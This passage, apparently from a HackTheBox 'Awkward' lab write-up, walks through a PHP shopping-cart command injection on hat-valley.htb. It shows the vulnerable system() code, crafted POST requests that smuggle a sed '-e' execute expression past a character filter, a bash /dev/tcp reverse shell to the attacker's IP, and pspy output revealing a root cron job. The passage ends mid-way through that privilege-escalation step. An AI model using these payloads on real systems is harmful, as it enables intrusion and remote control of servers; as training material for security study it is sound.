</span></span><span class=line><span class=cl>            system<span class=o>(</span><span class=s2>&#34;echo &#39;***Hat Valley Cart***&#39; &gt; {</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>        system<span class=o>(</span><span class=s2>&#34;head -2 {</span><span class=nv>$STORE_HOME</span><span class=s2>}product-details/{</span><span class=nv>$item_id</span><span class=s2>}.txt | tail -1 &gt;&gt; {</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Item added successfully!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Invalid item&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    exit<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//delete from cart
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;POST&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;delete_item&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;item&#39;</span><span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>])</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$item_id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;item&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$bad_chars</span> <span class=o>=</span> array<span class=o>(</span><span class=s2>&#34;;&#34;</span>,<span class=s2>&#34;&amp;&#34;</span>,<span class=s2>&#34;|&#34;</span>,<span class=s2>&#34;&gt;&#34;</span>,<span class=s2>&#34;&lt;&#34;</span>,<span class=s2>&#34;*&#34;</span>,<span class=s2>&#34;?&#34;</span>,<span class=s2>&#34;`&#34;</span>,<span class=s2>&#34;</span>$<span class=s2>&#34;</span>,<span class=s2>&#34;(&#34;</span>,<span class=s2>&#34;)&#34;</span>,<span class=s2>&#34;{&#34;</span>,<span class=s2>&#34;}&#34;</span>,<span class=s2>&#34;[&#34;</span>,<span class=s2>&#34;]&#34;</span>,<span class=s2>&#34;!&#34;</span>,<span class=s2>&#34;#&#34;</span><span class=o>)</span><span class=p>;</span> //no hacking allowed!!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach<span class=o>(</span><span class=nv>$bad_chars</span> as <span class=nv>$bad</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>strpos<span class=o>(</span><span class=nv>$item_id</span>, <span class=nv>$bad</span><span class=o>)</span> !<span class=o>==</span> FALSE<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;Bad character detected!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            exit<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach<span class=o>(</span><span class=nv>$bad_chars</span> as <span class=nv>$bad</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span>strpos<span class=o>(</span><span class=nv>$user_id</span>, <span class=nv>$bad</span><span class=o>)</span> !<span class=o>==</span> FALSE<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nb>echo</span> <span class=s2>&#34;Bad character detected!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            exit<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=o>(</span>checkValidItem<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        system<span class=o>(</span><span class=s2>&#34;sed -i &#39;/item_id={</span><span class=nv>$item_id</span><span class=s2>}/d&#39; {</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Item removed from cart&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;Invalid item&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    exit<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//fetch from cart
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;GET&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;action&#39;</span><span class=o>]</span> <span class=o>===</span> <span class=s1>&#39;fetch_items&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>])</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$html</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dir</span> <span class=o>=</span> scandir<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}cart&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$files</span> <span class=o>=</span> array_slice<span class=o>(</span><span class=nv>$dir</span>, 2<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    foreach<span class=o>(</span><span class=nv>$files</span> as <span class=nv>$file</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$user_id</span> <span class=o>=</span> substr<span class=o>(</span><span class=nv>$file</span>, -18<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=o>(</span><span class=nv>$user_id</span> <span class=o>===</span> <span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;user&#39;</span><span class=o>]</span> <span class=o>&amp;&amp;</span> checkValidItem<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$user_id</span><span class=s2>}&#34;</span><span class=o>))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$product_file</span> <span class=o>=</span> fopen<span class=o>(</span><span class=s2>&#34;{</span><span class=nv>$STORE_HOME</span><span class=s2>}cart/{</span><span class=nv>$file</span><span class=s2>}&#34;</span>, <span class=s2>&#34;r&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$details</span> <span class=o>=</span> array<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=o>((</span><span class=nv>$line</span> <span class=o>=</span> fgets<span class=o>(</span><span class=nv>$product_file</span><span class=o>))</span> !<span class=o>==</span> <span class=nb>false</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=o>(</span>str_replace<span class=o>(</span>array<span class=o>(</span><span class=s2>&#34;\r&#34;</span>, <span class=s2>&#34;\n&#34;</span><span class=o>)</span>, <span class=s1>&#39;&#39;</span>, <span class=nv>$line</span><span class=o>)</span> !<span class=o>==</span> <span class=s2>&#34;***Hat Valley Cart***&#34;</span><span class=o>)</span> <span class=o>{</span> //don<span class=s1>&#39;t include first line
</span></span></span><span class=line><span class=cl><span class=s1>                    array_push($details, str_replace(array(&#34;\r&#34;, &#34;\n&#34;), &#39;&#39;, $line));
</span></span></span><span class=line><span class=cl><span class=s1>                }
</span></span></span><span class=line><span class=cl><span class=s1>            }
</span></span></span><span class=line><span class=cl><span class=s1>            foreach($details as $cart_item) {
</span></span></span><span class=line><span class=cl><span class=s1>                 $cart_items = explode(&#34;&amp;&#34;, $cart_item);
</span></span></span><span class=line><span class=cl><span class=s1>                 for($x = 0; $x &lt; count($cart_items); $x++) {
</span></span></span><span class=line><span class=cl><span class=s1>                      $cart_items[$x] = explode(&#34;=&#34;, $cart_items[$x]); //key and value as separate values in subarray
</span></span></span><span class=line><span class=cl><span class=s1>                 }
</span></span></span><span class=line><span class=cl><span class=s1>                 $html .= &#34;&lt;tr&gt;&lt;td&gt;{$cart_items[1][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[2][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[3][1]}&lt;/td&gt;&lt;td&gt;&lt;button data-id={$cart_items[0][1]} onclick=\&#34;removeFromCart(this, localStorage.getItem(&#39;</span>user<span class=s1>&#39;))\&#34; class=&#39;</span>remove-item<span class=err>&#39;</span>&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;<span class=s2>&#34;;
</span></span></span><span class=line><span class=cl><span class=s2>            }
</span></span></span><span class=line><span class=cl><span class=s2>        }
</span></span></span><span class=line><span class=cl><span class=s2>    }
</span></span></span><span class=line><span class=cl><span class=s2>    echo </span><span class=nv>$html</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>    exit;
</span></span></span><span class=line><span class=cl><span class=s2>}
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>When attempting to add to cart, it will check to ensure a file with matching item id exists in <code>/var/www/store/product-details</code>, and the file contains string <code>*** Hat Valley</code>.</p><p>Then, it will shell out via <code>system()</code> php function and output <code>*** Hat valley Cart***</code> to <code>/var/www/store/user_id</code>.</p><p>Finally, the script will add the first two lines from the product file to this user cart file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>checkValidItem</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$STORE_HOME</span><span class=si>}</span><span class=s2>product-details/</span><span class=si>{</span><span class=nv>$item_id</span><span class=si>}</span><span class=s2>.txt&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$STORE_HOME</span><span class=si>}</span><span class=s2>cart/</span><span class=si>{</span><span class=nv>$user_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;echo &#39;***Hat Valley Cart***&#39; &gt; </span><span class=si>{</span><span class=nv>$STORE_HOME</span><span class=si>}</span><span class=s2>cart/</span><span class=si>{</span><span class=nv>$user_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;head -2 </span><span class=si>{</span><span class=nv>$STORE_HOME</span><span class=si>}</span><span class=s2>product-details/</span><span class=si>{</span><span class=nv>$item_id</span><span class=si>}</span><span class=s2>.txt | tail -1 &gt;&gt; </span><span class=si>{</span><span class=nv>$STORE_HOME</span><span class=si>}</span><span class=s2>cart/</span><span class=si>{</span><span class=nv>$user_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Item added successfully!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>p</span>
</span></span></code></pre></td></tr></table></div></div><p>Our available product files:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bean@awkward:/var/www/store$ tail -v product-details/*
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; poduct-details/1.txt &lt;<span class=o>==</span>
</span></span><span class=line><span class=cl>***Hat Valley Product***
</span></span><span class=line><span class=cl><span class=nv>item_id</span><span class=o>=</span>1<span class=p>&amp;</span><span class=nv>item_name</span><span class=o>=</span>Yellow Beanie<span class=p>&amp;</span><span class=nv>item_brand</span><span class=o>=</span>Good Doggo<span class=p>&amp;</span><span class=nv>item_price</span><span class=o>=</span><span class=nv>$39</span>.90
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; product-details/2.txt &lt;<span class=o>==</span>
</span></span><span class=line><span class=cl>***Hat Valley Product***
</span></span><span class=line><span class=cl><span class=nv>item_id</span><span class=o>=</span>2<span class=p>&amp;</span><span class=nv>item_name</span><span class=o>=</span>Palm Tree Cap<span class=p>&amp;</span><span class=nv>item_brand</span><span class=o>=</span>Kool Kats<span class=p>&amp;</span><span class=nv>item_price</span><span class=o>=</span><span class=nv>$48</span>.50
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; product-details/3.txt &lt;<span class=o>==</span>
</span></span><span class=line><span class=cl>***Hat Valley Product***
</span></span><span class=line><span class=cl><span class=nv>item_id</span><span class=o>=</span>3<span class=p>&amp;</span><span class=nv>item_name</span><span class=o>=</span>Straw Hat<span class=p>&amp;</span><span class=nv>item_brand</span><span class=o>=</span>Sunny Summer<span class=p>&amp;</span><span class=nv>item_price</span><span class=o>=</span><span class=nv>$70</span>.00
</span></span></code></pre></td></tr></table></div></div><p>We can inject the user_id, avoiding the filter of bad characters that tries to stop us doing command injection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /cart_actions.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: store.hat-valley.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://store.hat-valley.htb/shop.php
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>Content-Length: 49
</span></span><span class=line><span class=cl>Origin: http://store.hat-valley.htb
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>item=1&amp;user=my_cool_injected_user&amp;action=add_item
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bean@awkward:/var/www/store$ ls -la cart/
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>drwxrwxrwx <span class=m>2</span> root     root     <span class=m>4096</span> Feb  <span class=m>4</span> 20:24 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>9</span> root     root     <span class=m>4096</span> Oct  <span class=m>6</span> 01:35 ..
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data www-data   <span class=m>96</span> Feb  <span class=m>4</span> 20:24 my_cool_injected_user
</span></span></code></pre></td></tr></table></div></div><p>This didn&rsquo;t really lead anywhere, but next, if we run pspy (process spy), add and remove items from cart as normal & expected user behaviour, we see:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/02/04 20:49:22 CMD: UID=33   PID=47950  | tail -1 
</span></span><span class=line><span class=cl>2023/02/04 20:49:22 CMD: UID=33   PID=47949  | head -2 /var/www/store/product-details/1.txt 
</span></span><span class=line><span class=cl>2023/02/04 20:49:22 CMD: UID=33   PID=47948  | sh -c head -2 /var/www/store/product-details/1.txt | tail -1 &gt;&gt; /var/www/store/cart/59ab-bdec-f4c-c29c 
</span></span><span class=line><span class=cl>2023/02/04 20:49:41 CMD: UID=33   PID=47951  | sh -c sed -i &#39;/item_id=1/d&#39; /var/www/store/cart/59ab-bdec-f4c-c29c 
</span></span></code></pre></td></tr></table></div></div><p>So the item (id = 1) is added to user cart, then <code>sed</code> is used to remove it from the cart. At this point, I went straight to <a href=https://gtfobins.github.io/gtfobins/sed/ target=_blank rel="noopener noreffer">GTFOBins</a>, to look at <code>sed</code> command injection. I initially tried the <code>-n</code> argument, but this didn&rsquo;t seem to work. Checking the <code>sed</code> man page, the <code>-e</code> argument allows us to specify a script expression to execute.</p><p>We write a reverse shell into <code>/dev/shm/test.sh</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bean@awkward:/dev/shm$ cat test.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/bash</span>
</span></span><span class=line><span class=cl>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/10.10.14.48/3322 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><p>We command inject <code>-e "1e /dev/shm/test.sh"</code> into the item_id, firstly ensuring that the cart file exists for our user id (by adding something so it exists in <code>/var/www/store/cart</code>). Note the <code>/dev/shm/test2.txt</code> file that sed will run against, so it doesn&rsquo;t bomb out. I ensured this file existed first:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /cart_actions.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: store.hat-valley.htb
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://store.hat-valley.htb/cart.php
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>Content-Length: 99
</span></span><span class=line><span class=cl>Origin: http://store.hat-valley.htb
</span></span><span class=line><span class=cl>DNT: 1
</span></span><span class=line><span class=cl>Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
</span></span><span class=line><span class=cl>Connection: close 
</span></span><span class=line><span class=cl>item=1/d&#39; -e &#34;1e /dev/shm/test.sh&#34; /dev/shm/test2.txt &#39;/&amp;user=59ab-bdec-f4c-c29c&amp;action=delete_item
</span></span></code></pre></td></tr></table></div></div><p>Process spy shows our command injection worked, and we have a shell!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/02/05 08:18:05 CMD: UID=33   PID=52825  | sh -c sed -i &#39;/item_id=1/d&#39; -e &#34;1e /dev/shm/test.sh&#34; /dev/shm/test2.txt &#39;//d&#39; /var/www/store/cart/59ab-bdec-f4c-c29c 
</span></span><span class=line><span class=cl>2023/02/05 08:18:05 CMD: UID=33   PID=52827  | sh -c /dev/shm/test.sh 
</span></span><span class=line><span class=cl>2023/02/05 08:18:05 CMD: UID=33   PID=52826  | sed -i /item_id=1/d -e 1e /dev/shm/test.sh /dev/shm/test2.txt //d /var/www/store/cart/59ab-bdec-f4c-c29c 
</span></span><span class=line><span class=cl>2023/02/05 08:18:05 CMD: UID=33   PID=52828  | /usr/bin/bash /dev/shm/test.sh 
</span></span><span class=line><span class=cl>2023/02/05 08:18:05 CMD: UID=33   PID=52829  | /usr/bin/bash /dev/shm/test.sh 
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s get a full, proper interactive shell using python:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>3322</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.48<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.185<span class=o>]</span> <span class=m>41522</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1334<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@awkward:~/store$
</span></span><span class=line><span class=cl>www-data@awkward:~/store$ python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>www-data@awkward:~/store$ ^Z
</span></span><span class=line><span class=cl>www-data@awkward:~/store$ 
</span></span></code></pre></td></tr></table></div></div><p>While running process spy to check my command injection, I also noticed a root (UID=0) cron job running:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57039  | mail -s Leave Request: bean.hill christine 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57041  | /usr/sbin/sendmail -oi -f root@awkward -t 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57042  | /usr/sbin/postdrop -r 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57043  | cleanup -z -t unix -u -c 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57049  | mail -s Leave Request: bean.hill christine 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57050  | trivial-rewrite -n rewrite -t unix -u -c 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57051  | /usr/sbin/sendmail -oi -f root@awkward -t 
</span></span><span class=line><span class=cl>2023/02/05 18:40:01 CMD: UID=0    PID=57053  | /usr/sbin/postdrop -r 
</span></span></code></pre></td></tr></table></div></div><p>If we look at the leave requests file, which the cron job reads &ndash; and the same CSV we were retrieving by API earlier &ndash; we, as part of the www-data group, have write access to it!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@awkward:~/store$ ls -la /var/www/private
</span></span><span class=line><span class=cl>total <span class=m>12</span>
</span></span><span class=line><span class=cl>dr-xr-x--- <span class=m>2</span> christine www-data <span class=m>4096</span> Oct  <span class=m>6</span> 01:35 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> root      root     <span class=m>4096</span> Oct  <span class=m>6</span> 01:35 ..
</span></span><span class=line><span class=cl>-rwxrwxrwx <span class=m>1</span> christine www-data  <span class=m>600</span> Feb  <span class=m>5</span> 08:30 leave_requests.csv
</span></span><span class=line><span class=cl>www-data@awkward:~/store$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>The above output from pspy suggests a cron job that sends an email for leave requests for bean and christine, based on the subject passed to <code>mail</code>. Searching the file system for the subject <code>Leave Request</code> we find the systemd service:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ww-data@awkward:/$ grep -irn <span class=s1>&#39;Leave Request&#39;</span> * 2&gt; /dev/null
</span></span><span class=line><span class=cl>etc/systemd/system/notify.service:2:Description<span class=o>=</span>Notifies Christine when a new leave request is submitted
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@awkward:/$ cat /etc/systemd/system/notify.service 
